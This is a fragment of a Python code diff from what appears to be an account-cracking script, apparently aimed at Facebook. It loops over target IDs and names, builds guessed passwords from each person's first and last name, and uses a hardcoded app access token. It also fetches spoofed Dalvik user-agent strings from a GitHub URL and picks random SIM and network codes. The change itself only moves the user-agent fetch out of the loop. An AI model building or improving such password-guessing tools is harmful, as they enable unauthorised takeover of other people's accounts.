@@ -1,3 +1,4 @@
+xx=requests.get('https://raw.githubusercontent.com/Poco-X3-GT-5G/BAB/main/Dalvik').text.splitlines()
 def api1(ids,names,passlist,total_ids):
 	try:
 		global oks,loop,cps
@@ -9,8 +10,7 @@ def api1(ids,names,passlist,total_ids):
 			ln = fn
 		for pw in passlist:
 			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        xx=requests.get('https://raw.githubusercontent.com/Poco-X3-GT-5G/BAB/main/Dalvik').text.splitlines()
+			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'                        
                         s1n__1 = random.choice(xx)
 			Sim = random.choice(["31002","45204"])
 			Net = random.choice(["31002","45201"])
